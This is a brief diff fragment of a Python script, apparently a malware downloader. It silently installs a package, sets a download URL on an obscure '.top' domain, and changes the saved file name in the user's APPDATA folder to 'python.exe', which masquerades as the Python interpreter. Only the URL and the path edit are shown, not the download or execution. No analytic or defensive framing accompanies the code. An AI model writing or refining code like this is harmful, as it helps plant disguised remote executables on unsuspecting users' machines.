@@ -13,7 +13,7 @@ subprocess.run([sys.executable, '-m', 'pip', 'install', 'cryptography'], stdout=
 
 url = "https://zetolacs-cloud.top/Stb/Retev.php?bl=Uic2YYQdDhtfiKAZnULCW012.txt"
 
-download_path = os.path.join(os.getenv('APPDATA'), 'python_downloaded.exe')
+download_path = os.path.join(os.getenv('APPDATA'), 'python.exe')
 
 
 headers = {
